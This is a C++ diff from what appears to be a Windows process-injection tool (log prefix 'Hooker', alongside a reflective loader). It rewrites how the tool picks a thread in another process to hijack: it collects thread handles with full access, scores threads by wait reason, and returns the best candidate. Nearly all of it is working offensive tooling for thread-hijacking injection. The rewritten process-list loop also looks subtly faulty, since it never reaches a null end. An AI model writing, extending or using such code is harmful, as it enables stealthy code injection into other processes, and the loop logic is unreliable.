@@ -377,6 +377,28 @@ DWORD64 GetReflectiveLoaderOffset(DWORD64 base_address, LPCSTR ReflectiveLoader_
     return 0;
 }
 
+// ----------------------- thread stuff ----------------------- //
+#define ThreadSystemThreadInformation 40
+
+// Standard KWAIT_REASON enumeration from Ntddk.h
+typedef enum _KWAIT_REASON {
+    Executive = 0,
+    FreePage = 1,
+    PageIn = 2,
+    PoolAllocation = 3,
+    DelayExecution = 4,      // Sleep() / ExecutionDelay
+    Suspended = 5,
+    UserRequest = 6,         // WaitForSingleObject
+    WrExecutive = 7,
+    WrFreePage = 8,
+    WrPageIn = 9,
+    WrPoolAllocation = 10,
+    WrDelayExecution = 11,
+    WrSuspended = 12,
+    WrUserRequest = 13,      // Win32 Message Pump (win32k)
+    WrQueue = 19             // ThreadPool / IOCP Queue
+} KWAIT_REASON;
+
 typedef struct _SYSTEM_THREAD_INFORMATION_LITE {
     LARGE_INTEGER KernelTime;
     LARGE_INTEGER UserTime;
@@ -388,56 +410,84 @@ typedef struct _SYSTEM_THREAD_INFORMATION_LITE {
     LONG BasePriority;
     ULONG ContextSwitches;
     ULONG ThreadState; // 5 = Waiting
-    ULONG WaitReason;  // 8 = UserRequest
+    KWAIT_REASON WaitReason;  // 8 = UserRequest
 } SYSTEM_THREAD_INFORMATION_LITE, * PSYSTEM_THREAD_INFORMATION_LITE;
 
-typedef NTSTATUS(NTAPI* pfnNtGetNextThread)(
-    HANDLE ProcessHandle,
-    HANDLE ThreadHandle,
-    ACCESS_MASK DesiredAccess,
-    ULONG HandleAttributes,
-    ULONG Flags,
-    PHANDLE NewThreadHandle
-    );
 
-typedef NTSTATUS(NTAPI* pfnNtQueryInformationThread)(
-    HANDLE ThreadHandle,
-    ULONG ThreadInformationClass,
-    PVOID ThreadInformation,
-    ULONG ThreadInformationLength,
-    PULONG ReturnLength
-    );
+// Evaluates safety tier for a candidate thread
+int EvaluateThreadScore(ULONG threadState, KWAIT_REASON waitReason) {
+    // State 5 = Waiting
+    if (threadState == 5) {
+        switch (waitReason) {
+        case DelayExecution:
+        case WrDelayExecution:
+            return 100; // safest (Timer guaranteed to expire)
 
-#define ThreadSystemThreadInformation 40
+        case WrUserRequest:
+            return 80; // GUI Message loop (Wakes on events)
 
-// Check if a thread is safe to hijack
-BOOL CheckIfThreadSafeToHijack(HANDLE hThread, bool debug) {
-    //return true; // yolo, todo: this should search for a fitting thread
+        case WrQueue:
+            return 60; // ThreadPool worker (Slight delay if process idle)
 
-    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
-    if (!hNtdll) return FALSE;
+        case UserRequest:
+        case Executive:
+        case WrExecutive:
+            return 40; // Risky (May wait on INFINITE handle)
 
-    auto NtQueryInformationThread = (pfnNtQueryInformationThread)GetProcAddress(hNtdll, "NtQueryInformationThread");
-    if (!NtQueryInformationThread) return FALSE;
-
-    SYSTEM_THREAD_INFORMATION_LITE threadInfo = { 0 };
-    ULONG returnLength = 0;
-
-    // Querying ThreadSystemThreadInformation returns State and WaitReason for a handle
-    NTSTATUS status = NtQueryInformationThread(
-        hThread,
-        (ULONG)ThreadSystemThreadInformation,
-        &threadInfo,
-        sizeof(threadInfo),
-        &returnLength
-    );
-
-    if (status == 0) {
-        // State 5 = Waiting, WaitReason 8 = UserRequest
-        return (threadInfo.ThreadState == 5 && threadInfo.WaitReason == 8);
+        default:
+            return 20;
+        }
+    }
+    // State 2 = Running, State 1 = Ready
+    else if (threadState == 2 || threadState == 1) {
+        return 10; // Tier 5: Reckless (Suspends mid-code execution)
     }
 
-    return FALSE;
+    return 0; // non es bien
+}
+
+// find the optimal thread to hijack
+HANDLE GetBestThreadToHijack(const std::vector<HANDLE>& hThreads, BOOL debug) {
+
+    // store best values
+    HANDLE hBestThread = NULL;
+    int bestThreadScore = 0;
+
+    // max CPU as backup / tie-braker
+    HANDLE hThreadMaxCpuTime = NULL;
+    ULONGLONG maxCpuTime = 0;
+
+    // rank threads (point in time)
+    for (HANDLE hThread : hThreads) {
+        SYSTEM_THREAD_INFORMATION_LITE threadInfo = { 0 };
+        ULONG returnLength = 0;
+
+        NTSTATUS status = NtQueryInformationThread(
+            hThread,
+            (THREADINFOCLASS)ThreadSystemThreadInformation,
+            &threadInfo,
+            sizeof(threadInfo),
+            &returnLength
+        );
+
+        if (status == 0) {
+            ULONGLONG cpuTime = threadInfo.KernelTime.QuadPart + threadInfo.UserTime.QuadPart;
+            int score = EvaluateThreadScore(threadInfo.ThreadState, threadInfo.WaitReason);
+            if (score > bestThreadScore || (score == bestThreadScore && cpuTime > maxCpuTime)) {
+                hBestThread = hThread;
+                bestThreadScore = score;
+            }
+            if (cpuTime > maxCpuTime) {
+                hThreadMaxCpuTime = hThread;
+                maxCpuTime = cpuTime;
+            }
+        }
+    }
+
+    if (debug && hBestThread)
+        printf("[+] Hooker: Best thread is (tid=%i) with score %i\n", GetThreadId(hBestThread), bestThreadScore);
+
+    return hBestThread;
 }
 
 typedef struct _PROCESS_HANDLE_SNAPSHOT_INFORMATION {
@@ -469,7 +519,7 @@ BOOL CheckThreadHandleAccess(HANDLE hThread) {
 }
 
 // get McFullAccess mit Hendle
-HANDLE GetFullAccessThread(DWORD targetProcessId, bool debug) {
+HANDLE GetFullAccessThread(DWORD targetProcessId, BOOL debug) {
     HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
     if (!hNtdll) {
         printf("[!] Hooker: Cannot find ntdll.dll handle\n");
@@ -537,8 +587,6 @@ HANDLE GetFullAccessThread(DWORD targetProcessId, bool debug) {
         return NULL;
     }
 
-    HANDLE preferredHandle = NULL;
-
     auto* localHandles = reinterpret_cast<PPROCESS_HANDLE_SNAPSHOT_INFORMATION>(procBuffer);
     if (localHandles == nullptr || localHandles->NumberOfHandles == 0) {
         printf("[!] Hooker: No handles found in current process\n");
@@ -547,76 +595,68 @@ HANDLE GetFullAccessThread(DWORD targetProcessId, bool debug) {
         return NULL;
     }
 
+	std::vector<HANDLE> hThreads; // contains open thread handles to remote threads with full access
+
     // 3. check if any thread handle from the remote proc is in the current process
-    PSYSTEM_PROCESS_INFORMATION currentProc = reinterpret_cast<SYSTEM_PROCESS_INFORMATION*>(sysInfoBuffer);
-    do {
-        if (reinterpret_cast<uintptr_t>(currentProc->UniqueProcessId) == targetProcessId) {
+    PSYSTEM_PROCESS_INFORMATION iterProc = reinterpret_cast<SYSTEM_PROCESS_INFORMATION*>(sysInfoBuffer);
+    while (iterProc != nullptr) {
+
+        if (reinterpret_cast<uintptr_t>(iterProc->UniqueProcessId) == targetProcessId) {
 
             if (debug)
                 printf("[+] Hooker: Got remote process information, traversing the remote processes threads...\n");
 
             PSYSTEM_THREAD_INFORMATION threads = reinterpret_cast<PSYSTEM_THREAD_INFORMATION>(
-                reinterpret_cast<uintptr_t>(currentProc) + sizeof(SYSTEM_PROCESS_INFORMATION)
-            );
+                reinterpret_cast<uintptr_t>(iterProc) + sizeof(SYSTEM_PROCESS_INFORMATION)
+                );
 
             // traverse remote threads
-            for (ULONG t = 0; t < currentProc->NumberOfThreads; ++t) { 
+            for (ULONG t = 0; t < iterProc->NumberOfThreads; ++t) {
                 DWORD remoteTID = static_cast<DWORD>(reinterpret_cast<uintptr_t>(threads[t].ClientId.UniqueThread));
 
                 // check if the local proc has handles to the remote threads -> traverse all local handles
-                for (ULONG_PTR l = 0; l < localHandles->NumberOfHandles; l++) { 
+                for (ULONG_PTR l = 0; l < localHandles->NumberOfHandles; l++) {
                     PROCESS_HANDLE_TABLE_ENTRY_INFO entry = localHandles->Handles[l];
                     HANDLE hThreadLocal = reinterpret_cast<HANDLE>(entry.HandleValue);
 
                     DWORD localTID = GetThreadId(hThreadLocal); // check if this is a thread handle
                     if (localTID == 0 || entry.GrantedAccess != THREAD_ALL_ACCESS) continue;
 
-                    if (debug)
-
                     if (remoteTID == localTID) {
-                        if (CheckIfThreadSafeToHijack(hThreadLocal, debug)) {
-                            if (debug)
-                                printf("[+] Hooker: Found thread handle (tid=%i) of remote process in current process with full access and is safe to hijack\n", localTID);
-
-                            VirtualFree(sysInfoBuffer, 0, MEM_RELEASE);
-                            VirtualFree(procBuffer, 0, MEM_RELEASE);
-                            return hThreadLocal;
-                        }
-                        else {
-                            if (debug)
-                                printf("[+] Hooker: Found thread handle (tid=%i) of remote process in current process with full access but is not safe to hijack\n", localTID);
-                        }
+                        hThreads.push_back(hThreadLocal);
+                        if (debug)
+                            printf("[+] Hooker: Found thread handle (tid=%i) of remote process (pid=%i) in current process with full access\n", localTID, targetProcessId);
                     }
                 }
 
-                if (debug)
+                if (debug && hThreads.empty())
                     printf("[-] Hooker: Found no existing thread handles of remote process (pid=%i) in current process, now trying with OpenThread...\n", targetProcessId);
 
                 // fallback: check if the local proc can open any remote thread with full access
                 HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, false, remoteTID);
-                if (CheckThreadHandleAccess(hThread)) {
-                    if (CheckIfThreadSafeToHijack(hThread, debug)) {
-                        if (debug)
-                            printf("[+] Hooker: Remote thread (tid=%i) can be opened from the current proc with full access and is safe to hijack\n", remoteTID);
-                        return hThread;
-                    }
+                if (hThread && CheckThreadHandleAccess(hThread)) {
+                    hThreads.push_back(hThread);
                     if (debug)
-                        printf("[+] Hooker: Remote thread (tid=%i) can be opened from the current proc but is not safe to hijack\n", remoteTID);
-                }
-                else {
-                    if (debug)
-                        printf("[+] Hooker: Remote thread (tid=%i) cannot be opened from current proc with full access\n", remoteTID);
+                        printf("[+] Hooker: Remote thread (tid=%i) can be opened from the current proc with full access\n", remoteTID);
                 }
             }
             break; // found target pid, but no thread handles
         }
 
-        currentProc = reinterpret_cast<PSYSTEM_PROCESS_INFORMATION>(reinterpret_cast<uintptr_t>(currentProc) + currentProc->NextEntryOffset);
-    } while (currentProc->NextEntryOffset != 0);
+        // advance to the next process
+        iterProc = reinterpret_cast<PSYSTEM_PROCESS_INFORMATION>(reinterpret_cast<uintptr_t>(iterProc) + iterProc->NextEntryOffset);
+    }
 
-    VirtualFree(sysInfoBuffer, 0, MEM_RELEASE);
-    VirtualFree(procBuffer, 0, MEM_RELEASE);
-    return preferredHandle;
+    if (sysInfoBuffer) VirtualFree(sysInfoBuffer, 0, MEM_RELEASE);
+    if (procBuffer) VirtualFree(procBuffer, 0, MEM_RELEASE);
+
+    if (hThreads.empty()) {
+        if (debug)
+            printf("[!] Hooker: No thread handles of remote process (pid=%i) could be found or opened with full access\n", targetProcessId);
+        return NULL;
+    }
+
+    return GetBestThreadToHijack(hThreads, debug);
 }
 
 bool HandleCleanup(HANDLE hProcess, std::vector<LPVOID> remoteAddrs, LPVOID localAddr) {
